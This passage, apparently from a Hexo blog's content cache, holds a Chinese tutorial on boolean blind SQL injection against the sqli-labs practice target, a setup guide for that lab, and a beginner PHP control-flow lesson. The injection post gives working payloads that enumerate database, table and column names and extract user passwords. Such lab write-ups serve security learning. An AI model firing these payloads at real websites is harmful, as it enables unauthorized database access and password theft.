,但是无论怎么换我们都是要缩小数据库长度的范围，最终确定数据库的长度。<br><img src=\"https://img-blog.csdnimg.cn/20200305204807114.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br><img src=\"https://img-blog.csdnimg.cn/20200305204830900.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>上面输入8，页面返回正常；然而输入9就出现异常。从而就可以判断出数据库名称的长度为8。</p>\n<h3 id=\"3-判断数据库名。\"><a href=\"#3-判断数据库名。\" class=\"headerlink\" title=\"3.判断数据库名。\"></a>3.判断数据库名。</h3><p>我们要使用     <strong>1’ and (ascii(substr(database(),1,1))&gt;97)–+</strong>，来一一判断数据库的ascii值。最终得到数据库的名称。<br><img src=\"https://img-blog.csdnimg.cn/20200305210117120.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br><img src=\"https://img-blog.csdnimg.cn/2020030521012519.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>在上面输入114发现页面正常，115却页面不正常，从而判断出数据库第一个的开头的ascii值为115，也就是s。<br>我们需要了解相关的函数：<br><strong>length()返回字符串的长度<br>substr()截取字符串的字符<br>    database()，返回当前数据库名<br>    第一个1，表示截取字符串的起始位置。\u000b    第二个1，表示截取字符串长度\u000b    语句作用：判断第一个库第一个字符是什么<br>ascii()将字符串转换成其ASCII码</strong><br>把第一个1换成2，就会出现第二个字符的值。以此轮回，最终就会确定数据库的名称。</p>\n<h3 id=\"4-爆出表名。\"><a href=\"#4-爆出表名。\" class=\"headerlink\" title=\"4.爆出表名。\"></a>4.爆出表名。</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id&#x3D;1&#39; and (ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1,1)))&gt;1 --+</span><br></pre></td></tr></table></figure>\n<p>同样也是通过ascii来一一判断出表名。通过修改 limit 0,1 来获取其他表名。</p>\n<h3 id=\"5-曝出列名。\"><a href=\"#5-曝出列名。\" class=\"headerlink\" title=\"5.曝出列名。\"></a>5.曝出列名。</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id&#x3D;1&#39; and (ascii(substr((select column_name from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 0,1),1,1)))&gt;1 --+</span><br></pre></td></tr></table></figure>\n<p>也是修改limit后面的值来爆出列名。</p>\n<h3 id=\"6-爆值。\"><a href=\"#6-爆值。\" class=\"headerlink\" title=\"6.爆值。\"></a>6.爆值。</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id&#x3D;1&#39; and (ascii(substr(( select password from users limit 0,1),1,1)))&gt;1--+</span><br></pre></td></tr></table></figure>\n<p>同上。<br>这个过程是非常漫长的。我们也有其他的方法进行盲注。用python脚本，和burp更加简单。<br>大佬博客<a href=\"https://www.cnblogs.com/hackxf/p/8893245.html\" target=\"_blank\" rel=\"noopener\">burp进行盲注</a><br><a href=\"https://blog.csdn.net/weixin_40709439\" target=\"_blank\" rel=\"noopener\">布尔盲注</a><br>小白持续更新中！！！</p>\n","site":{"data":{}},"excerpt":"","more":"<p>前不久又学习了sql注入的布尔盲注，现在总结一下。<br><strong>布尔盲注的前提：没有显示位，没有sql语句执行错误的信息（和联合查询就不同了）。只能通过页面返回正常不正常来判断是否存在注入。</strong></p>\n<h3 id=\"1-当然第一步还是判断闭合符号，这是基础。这都搞不了，下面就无法进行了。\"><a href=\"#1-当然第一步还是判断闭合符号，这是基础。这都搞不了，下面就无法进行了。\" class=\"headerlink\" title=\"1.当然第一步还是判断闭合符号，这是基础。这都搞不了，下面就无法进行了。\"></a>1.当然第一步还是判断闭合符号，这是基础。这都搞不了，下面就无法进行了。</h3><h3 id=\"2-第二部就是判断数据库的长度。\"><a href=\"#2-第二部就是判断数据库的长度。\" class=\"headerlink\" title=\"2.第二部就是判断数据库的长度。\"></a>2.第二部就是判断数据库的长度。</h3><p>  我们需要知道这一函数   <strong>1’ and (length(database())=8)–+</strong>，通过它来判断数据库的长度，当然=可以换成 &gt;,&lt;  ,但是无论怎么换我们都是要缩小数据库长度的范围，最终确定数据库的长度。<br><img src=\"https://img-blog.csdnimg.cn/20200305204807114.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br><img src=\"https://img-blog.csdnimg.cn/20200305204830900.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>上面输入8，页面返回正常；然而输入9就出现异常。从而就可以判断出数据库名称的长度为8。</p>\n<h3 id=\"3-判断数据库名。\"><a href=\"#3-判断数据库名。\" class=\"headerlink\" title=\"3.判断数据库名。\"></a>3.判断数据库名。</h3><p>我们要使用     <strong>1’ and (ascii(substr(database(),1,1))&gt;97)–+</strong>，来一一判断数据库的ascii值。最终得到数据库的名称。<br><img src=\"https://img-blog.csdnimg.cn/20200305210117120.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br><img src=\"https://img-blog.csdnimg.cn/2020030521012519.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>在上面输入114发现页面正常，115却页面不正常，从而判断出数据库第一个的开头的ascii值为115，也就是s。<br>我们需要了解相关的函数：<br><strong>length()返回字符串的长度<br>substr()截取字符串的字符<br>    database()，返回当前数据库名<br>    第一个1，表示截取字符串的起始位置。\u000b    第二个1，表示截取字符串长度\u000b    语句作用：判断第一个库第一个字符是什么<br>ascii()将字符串转换成其ASCII码</strong><br>把第一个1换成2，就会出现第二个字符的值。以此轮回，最终就会确定数据库的名称。</p>\n<h3 id=\"4-爆出表名。\"><a href=\"#4-爆出表名。\" class=\"headerlink\" title=\"4.爆出表名。\"></a>4.爆出表名。</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id&#x3D;1&#39; and (ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1,1)))&gt;1 --+</span><br></pre></td></tr></table></figure>\n<p>同样也是通过ascii来一一判断出表名。通过修改 limit 0,1 来获取其他表名。</p>\n<h3 id=\"5-曝出列名。\"><a href=\"#5-曝出列名。\" class=\"headerlink\" title=\"5.曝出列名。\"></a>5.曝出列名。</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id&#x3D;1&#39; and (ascii(substr((select column_name from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 0,1),1,1)))&gt;1 --+</span><br></pre></td></tr></table></figure>\n<p>也是修改limit后面的值来爆出列名。</p>\n<h3 id=\"6-爆值。\"><a href=\"#6-爆值。\" class=\"headerlink\" title=\"6.爆值。\"></a>6.爆值。</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id&#x3D;1&#39; and (ascii(substr(( select password from users limit 0,1),1,1)))&gt;1--+</span><br></pre></td></tr></table></figure>\n<p>同上。<br>这个过程是非常漫长的。我们也有其他的方法进行盲注。用python脚本，和burp更加简单。<br>大佬博客<a href=\"https://www.cnblogs.com/hackxf/p/8893245.html\" target=\"_blank\" rel=\"noopener\">burp进行盲注</a><br><a href=\"https://blog.csdn.net/weixin_40709439\" target=\"_blank\" rel=\"noopener\">布尔盲注</a><br>小白持续更新中！！！</p>\n"},{"title":"phpstduy下sql libs下载，安装教程。","date":"2020-03-02T07:04:05.000Z","photos":["https://cdn.jsdelivr.net/gh/yremp/cdn@2.1.5/img/cover/(3).jpg.webp"],"_content":"\n\n\n﻿# 1.sql libs的下载。\n\n###  sql libs的源代码地址：[https://github.com/Audi-1/sqli-labs](https://github.com/Audi-1/sqli-labs)  ，git进自己phpstduy文件夹的www文件夹内。\n#  2.找到sql libs文件夹内的sql-connections。\n###  找到db-creds.inc文本并打开，把里面的用户名和密码换成自己的，因为里面密码是空着的。\n![在这里插入图片描述](https://img-blog.csdnimg.cn/2020030210462389.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\n#  3.sql libs安装。\n###  浏览器里输入[http://localhost/sqli-labs/](http://localhost/sqli-labs/)会出现如图。点![在这里插入图片描述](https://img-blog.csdnimg.cn/20200302105158104.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\n###  点击第一个进行数据库安装。\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200302105312844.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\n出现这样的页面就是安装成功了。\n然后就可以闯关了。\n","source":"_posts/phpstduy下sql libs下载，安装教程。.md","raw":"---\ntitle: phpstduy下sql libs下载，安装教程。\ndate: 2020-03-02 15:04:05\ntags: 靶场\ncategories: 技术\nphotos:  https://cdn.jsdelivr.net/gh/yremp/cdn@2.1.5/img/cover/(3).jpg.webp\n---\n\n\n\n﻿# 1.sql libs的下载。\n\n###  sql libs的源代码地址：[https://github.com/Audi-1/sqli-labs](https://github.com/Audi-1/sqli-labs)  ，git进自己phpstduy文件夹的www文件夹内。\n#  2.找到sql libs文件夹内的sql-connections。\n###  找到db-creds.inc文本并打开，把里面的用户名和密码换成自己的，因为里面密码是空着的。\n![在这里插入图片描述](https://img-blog.csdnimg.cn/2020030210462389.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\n#  3.sql libs安装。\n###  浏览器里输入[http://localhost/sqli-labs/](http://localhost/sqli-labs/)会出现如图。点![在这里插入图片描述](https://img-blog.csdnimg.cn/20200302105158104.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\n###  点击第一个进行数据库安装。\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200302105312844.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\n出现这样的页面就是安装成功了。\n然后就可以闯关了。\n","slug":"phpstduy下sql libs下载，安装教程。","published":1,"updated":"2020-05-11T08:58:23.940Z","comments":1,"layout":"post","link":"","_id":"ckchhpsgw000h9kq6g017dmt8","content":"<p>﻿# 1.sql libs的下载。</p>\n<h3 id=\"sql-libs的源代码地址：https-github-com-Audi-1-sqli-labs-，git进自己phpstduy文件夹的www文件夹内。\"><a href=\"#sql-libs的源代码地址：https-github-com-Audi-1-sqli-labs-，git进自己phpstduy文件夹的www文件夹内。\" class=\"headerlink\" title=\"sql libs的源代码地址：https://github.com/Audi-1/sqli-labs  ，git进自己phpstduy文件夹的www文件夹内。\"></a>sql libs的源代码地址：<a href=\"https://github.com/Audi-1/sqli-labs\" target=\"_blank\" rel=\"noopener\">https://github.com/Audi-1/sqli-labs</a>  ，git进自己phpstduy文件夹的www文件夹内。</h3><h1 id=\"2-找到sql-libs文件夹内的sql-connections。\"><a href=\"#2-找到sql-libs文件夹内的sql-connections。\" class=\"headerlink\" title=\"2.找到sql libs文件夹内的sql-connections。\"></a>2.找到sql libs文件夹内的sql-connections。</h1><h3 id=\"找到db-creds-inc文本并打开，把里面的用户名和密码换成自己的，因为里面密码是空着的。\"><a href=\"#找到db-creds-inc文本并打开，把里面的用户名和密码换成自己的，因为里面密码是空着的。\" class=\"headerlink\" title=\"找到db-creds.inc文本并打开，把里面的用户名和密码换成自己的，因为里面密码是空着的。\"></a>找到db-creds.inc文本并打开，把里面的用户名和密码换成自己的，因为里面密码是空着的。</h3><p><img src=\"https://img-blog.csdnimg.cn/2020030210462389.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p>\n<h1 id=\"3-sql-libs安装。\"><a href=\"#3-sql-libs安装。\" class=\"headerlink\" title=\"3.sql libs安装。\"></a>3.sql libs安装。</h1><h3 id=\"浏览器里输入http-localhost-sqli-labs-会出现如图。点\"><a href=\"#浏览器里输入http-localhost-sqli-labs-会出现如图。点\" class=\"headerlink\" title=\"浏览器里输入http://localhost/sqli-labs/会出现如图。点\"></a>浏览器里输入<a href=\"http://localhost/sqli-labs/\" target=\"_blank\" rel=\"noopener\">http://localhost/sqli-labs/</a>会出现如图。点<img src=\"https://img-blog.csdnimg.cn/20200302105158104.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></h3><h3 id=\"点击第一个进行数据库安装。\"><a href=\"#点击第一个进行数据库安装。\" class=\"headerlink\" title=\"点击第一个进行数据库安装。\"></a>点击第一个进行数据库安装。</h3><p><img src=\"https://img-blog.csdnimg.cn/20200302105312844.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>出现这样的页面就是安装成功了。<br>然后就可以闯关了。</p>\n","site":{"data":{}},"excerpt":"","more":"<p>﻿# 1.sql libs的下载。</p>\n<h3 id=\"sql-libs的源代码地址：https-github-com-Audi-1-sqli-labs-，git进自己phpstduy文件夹的www文件夹内。\"><a href=\"#sql-libs的源代码地址：https-github-com-Audi-1-sqli-labs-，git进自己phpstduy文件夹的www文件夹内。\" class=\"headerlink\" title=\"sql libs的源代码地址：https://github.com/Audi-1/sqli-labs  ，git进自己phpstduy文件夹的www文件夹内。\"></a>sql libs的源代码地址：<a href=\"https://github.com/Audi-1/sqli-labs\" target=\"_blank\" rel=\"noopener\">https://github.com/Audi-1/sqli-labs</a>  ，git进自己phpstduy文件夹的www文件夹内。</h3><h1 id=\"2-找到sql-libs文件夹内的sql-connections。\"><a href=\"#2-找到sql-libs文件夹内的sql-connections。\" class=\"headerlink\" title=\"2.找到sql libs文件夹内的sql-connections。\"></a>2.找到sql libs文件夹内的sql-connections。</h1><h3 id=\"找到db-creds-inc文本并打开，把里面的用户名和密码换成自己的，因为里面密码是空着的。\"><a href=\"#找到db-creds-inc文本并打开，把里面的用户名和密码换成自己的，因为里面密码是空着的。\" class=\"headerlink\" title=\"找到db-creds.inc文本并打开，把里面的用户名和密码换成自己的，因为里面密码是空着的。\"></a>找到db-creds.inc文本并打开，把里面的用户名和密码换成自己的，因为里面密码是空着的。</h3><p><img src=\"https://img-blog.csdnimg.cn/2020030210462389.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p>\n<h1 id=\"3-sql-libs安装。\"><a href=\"#3-sql-libs安装。\" class=\"headerlink\" title=\"3.sql libs安装。\"></a>3.sql libs安装。</h1><h3 id=\"浏览器里输入http-localhost-sqli-labs-会出现如图。点\"><a href=\"#浏览器里输入http-localhost-sqli-labs-会出现如图。点\" class=\"headerlink\" title=\"浏览器里输入http://localhost/sqli-labs/会出现如图。点\"></a>浏览器里输入<a href=\"http://localhost/sqli-labs/\" target=\"_blank\" rel=\"noopener\">http://localhost/sqli-labs/</a>会出现如图。点<img src=\"https://img-blog.csdnimg.cn/20200302105158104.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></h3><h3 id=\"点击第一个进行数据库安装。\"><a href=\"#点击第一个进行数据库安装。\" class=\"headerlink\" title=\"点击第一个进行数据库安装。\"></a>点击第一个进行数据库安装。</h3><p><img src=\"https://img-blog.csdnimg.cn/20200302105312844.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>出现这样的页面就是安装成功了。<br>然后就可以闯关了。</p>\n"},{"title":"php学习--各种语句（四）","date":"2020-05-10T07:04:05.000Z","photos":["https://cdn.jsdelivr.net/gh/yremp/cdn@2.1.5/img/cover/(7).jpg.webp"],"_content":"\n\n\n﻿目录：\n0×01:  if语句\n0×02：switch 语句\n0×03：循环语句\n0×04：特殊的控制语句\n\n**0×01:if语句**\n\n   ① if(表达式)   语句(代码块)；\n    如果表达式的值为true，就执行后面的语句或者代码块；反之跳过这个语句。\n\n```\n$a=18;\n$b=15;\nif($b>=$a)  {\necho \"你已经成年！\"\n}\necho \"你还未成年！\"\n```\n\n②if.....else..语句\n\n\n```\nif(语句)\n{   1 }\nelse\n{  2  }   //如果语句为true，则执行1，为false则执行2。\n```\n\n③if \nelse if\nelse if \nelse 语句\n\n```\nif（语句1）\n{ 结果1}\nelse if（语句2）\n{   结果2 }\nelse if（语句3）\n{结果3}  //首先判断语句1是否为true，为true则执行结果1，为false则判断语句2，语句2 为true则执行结果2，否则判断语句3，直到结束或为true。\nelse \n{结果4}\n```\n\n **0×02：switch 语句**\n\n```\nswitch（表达式）{\n  case  值1：\n  结果1；\n  break；\n  \n   case  值2：\n    结果2；\n    break；\n    \n    case 值3：\n    结果3；\n    break；\n    \n    default：\n      语句N；\n    }\n```\n注意：`表达式的值=值几的时候，才会执行结果几。如果都不满足则执行最后一个default语句，break是必不可少的结束符。`\n\n\n**0×03：循环语句**\n\n\n①while语句\n```\nwhile（表达式）{\n各种语句\n}\n```\n当表达式的值为true，执行各种语句，直到表达式的值为false。\n\n②do....while 语句\n\n```\ndo{\n各种语句\n}  while（表达式）；//先执行各种语句，再判断表达式的真假。\n```\n注意：`while（）与do()...while的区别在于do ...while语句至少会被执行一次。`\n\n\n③for语句\n\n```\nfor（语句1；语句2；语句3）{\n各种语句}\n```\n语句1：多为初始化的语句，$a=0;\n语句2：多为判断是否为真值。\n语句3：变量自增，自减的语句。\n注意：`无论是语句1，还是语句2，都可以放多个表达式，中间需要用逗号隔开`。\n\n**0×04：特殊的控制语句**\n\n①break语句\n    用于中断一些循环。后面可以接上一些数字表示跳出几层循环，不加默认为跳出当前循环。\n\n②continue语句\n只能在循环语句中起作用，表示结束本次循环，本不是结束整个循环语句。\n\n③exit（）函数\n结束当前整个程序的执行，并退出。\ndie()函数和其一样。\n","source":"_posts/php学习--各种语句（四）.md","raw":"---\n\ntitle: php学习--各种语句（四）\ndate: 2020-05-10 15:04:05\ntags: php学习\ncategories: 技术\nphotos:  https://cdn.jsdelivr.net/gh/yremp/cdn@2.1.5/img/cover/(7).jpg.webp\n\n---\n\n\n\n﻿目录：\n0×01:  if语句\n0×02：switch 语句\n0×03：循环语句\n0×04：特殊的控制语句\n\n**0×01:if语句**\n\n   ① if(表达式)   语句(代码块)；\n    如果表达式的值为true，就执行后面的语句或者代码块；反之跳过这个语句。\n\n```\n$a=18;\n$b=15;\nif($b>=$a)  {\necho \"你已经成年！\"\n}\necho \"你还未成年！\"\n```\n\n②if.....else..语句\n\n\n```\nif(语句)\n{   1 }\nelse\n{  2  }   //如果语句为true，则执行1，为false则执行2。\n```\n\n③if \nelse if\nelse if \nelse 语句\n\n```\nif（语句1）\n{ 结果1}\nelse if（语句2）\n{   结果2 }\nelse if（语句3）\n{结果3}  //首先判断语句1是否为true，为true则执行结果1，为false则判断语句2，语句2 为true则执行结果2，否则判断语句3，直到结束或为true。\nelse \n{结果4}\n```\n\n **0×02：switch 语句**\n\n```\nswitch（表达式）{\n  case  值1：\n  结果1；\n  break；\n  \n   case  值2：\n    结果2；\n    break；\n    \n    case 值3：\n    结果3；\n    break；\n    \n    default：\n      语句N；\n    }\n```\n注意：`表达式的值=值几的时候，才会执行结果几。如果都不满足则执行最后一个default语句，break是必不可少的结束符。`\n\n\n**0×03：循环语句**\n\n\n①while语句\n```\nwhile（表达式）{\n各种语句\n}\n```\n当表达式的值为true，执行各种语句，直到表达式的值为false。\n\n②do....while 语句\n\n```\ndo{\n各种语句\n}  while（表达式）；//先执行各种语句，再判断表达式的真假。\n```\n注意：`while（）与do()...while的区别在于do ...while语句至少会被执行一次。`\n\n\n③for语句\n\n```\nfor（语句1；语句2；语句3）{\n各种语句}\n```\n语句1：多为初始化的语句，$a=0;\n语句2：多为判断是否为真值。\n语句3：变量自增，自减的语句。\n注意：`无论是语句1，还是语句2，都可以放多个表达式，中间需要用逗号隔开`。\n\n**0×04：特殊的控制语句**\n\n①break语句\n    用于中断一些循环。后面可以接上一些数字表示跳出几层循环，不加默认为跳出当前循环。\n\n②continue语句\n只能在循环语句中起作用，表示结束本次循环，本不是结束整个循环语句。\n\n③exit（）函数\n结束当前整个程序的执行，并退出。\ndie()函数和其一样。\n","slug":"php学习--各种语句（四）","published":1,"updated":"2020-05-20T15:39:00.615Z","comments":1,"layout":"post","link":"","_id":"ckchhpsgy000k9kq67whh822i","content":"<p>﻿目录：<br>0×01:  if语句<br>0×02：switch 语句<br>0×03：循环语句<br>0×04：特殊的控制语句</p>\n<p><strong>0×01:if语句</strong></p>\n<p>   ① if(表达式)   语句(代码块)；<br>    如果表达式的值为true，就执行后面的语句或者代码块；反之跳过这个语句。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$a&#x3D;18;</span><br><span class=\"line\">$b&#x3D;15;</span><br><span class=\"line\">if($b&gt;&#x3D;$a)  &#123;</span><br><span class=\"line\">echo &quot;你已经成年！&quot;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">echo &quot;你还未成年！&quot;</span><br></pre></td></tr></table></figure>\n\n<p>②if…..else..语句</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if(语句)</span><br><span class=\"line\">&#123;   1 &#125;</span><br><span class=\"line\">else</span><br><span class=\"line\">&#123;  2  &#125;   &#x2F;&#x2F;如果语句为true，则执行1，为false则执行2。</span><br></pre></td></tr></table></figure>\n\n<p>③if<br>else if<br>else if<br>else 语句</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if（语句1）</span><br><span class=\"line\">&#123; 结果1&#125;</span><br><span class=\"line\">else if（语句2）</span><br><span class=\"line\">&#123;   结果2 &#125;</span><br><span class=\"line\">else if（语句3）</span><br><span class=\"line\">&#123;结果3&#125;  &#x2F;&#x2F;首先判断语句1是否为true，为true则执行结果1，为false则判断语句2，语句2 为true则执行结果2，否则判断语句3，直到结束或为true。</span><br><span class=\"line\">else </span><br><span class=\"line\">&#123;结果4&#125;</span><br></pre></td></tr></table></figure>\n\n<p> <strong>0×02：switch 语句</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">switch（表达式）&#123;</span><br><span class=\"line\">  case  值1：</span><br><span class=\"line\">  结果1；</span><br><span class=\"line\">  break；</span><br><span class=\"line\">  </span><br><span class=\"line\">   case  值2：</span><br><span class=\"line\">    结果2；</span><br><span class=\"line\">    break；</span><br><span class=\"line\">    </span><br><span class=\"line\">    case 值3：</span><br><span class=\"line\">    结果3；</span><br><span class=\"line\">    break；</span><br><span class=\"line\">    </span><br><span class=\"line\">    default：</span><br><span class=\"line\">      语句N；</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<p>注意：<code>表达式的值=值几的时候，才会执行结果几。如果都不满足则执行最后一个default语句，break是必不可少的结束符。</code></p>\n<p><strong>0×03：循环语句</strong></p>\n<p>①while语句</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">while（表达式）&#123;</span><br><span class=\"line\">各种语句</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>当表达式的值为true，执行各种语句，直到表达式的值为false。</p>\n<p>②do….while 语句</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">do&#123;</span><br><span class=\"line\">各种语句</span><br><span class=\"line\">&#125;  while（表达式）；&#x2F;&#x2F;先执行各种语句，再判断表达式的真假。</span><br></pre></td></tr></table></figure>\n<p>注意：<code>while（）与do()...while的区别在于do ...while语句至少会被执行一次。</code></p>\n<p>③for语句</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">for（语句1；语句2；语句3）&#123;</span><br><span class=\"line\">各种语句&#125;</span><br></pre></td></tr></table></figure>\n<p>语句1：多为初始化的语句，$a=0;<br>语句2：多为判断是否为真值。<br>语句3：变量自增，自减的语句。<br>注意：<code>无论是语句1，还是语句2，都可以放多个表达式，中间需要用逗号隔开</code>。</p>\n<p><strong>0×04：特殊的控制语句</strong></p>\n<p>①break语句<br>    用于中断一些循环。后面可以接上一些数字表示跳出几层循环，不加默认为跳出当前循环。</p>\n<p>②continue语句<br>只能在循环语句中起作用，表示结束本次循环，本不是结束整个循环语句。</p>\n<p>③exit（）函数<br>结束当前整个程序的执行，并退出。<br>die()函数和其一样。</p>\n","site":{"data":{}},"excerpt":"","more":"<p>﻿目录：<br>0×01:  if语句<br>0×02：switch 语句<br>0×03：循环语句<br>0×04：特殊的控制语句</p>\n<p><strong>0×01:if语句</strong></p>\n<p>   ① if(表达式)   语句(代码块)；<br>    如果表达式的值为true，就执行后面的语句或者代码块；反之跳过这个语句。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$a&#x3D;18;</span><br><span class=\"line\">$b&#x3D;15;</span><br><span 